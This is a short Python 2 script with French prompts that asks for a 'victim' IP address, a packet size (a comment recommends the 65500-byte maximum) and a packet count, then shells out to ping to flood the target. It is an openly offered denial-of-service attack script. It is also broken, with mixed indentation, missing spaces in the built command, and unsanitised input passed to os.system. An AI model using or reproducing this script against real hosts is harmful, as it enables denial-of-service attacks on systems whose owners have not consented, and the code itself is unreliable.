import os
import sys 

import time



def icmp_startattack():

    hostip = raw_input("ip de la victime")
  
    ippacketData = input("entrez la taille du paquet")
    number = input("entrez le nombre de paquet")
    # recommended size 65500 which is max available for ip packet 
    
	
    print ("Attaque de la cible en cours") 
   
    #    t = time.time()
	os.system("ping" + hostip + "-l" + ippacketData + "-n" + number)
	

        
 
	

icmp_startattack()  

print "attaque finis"
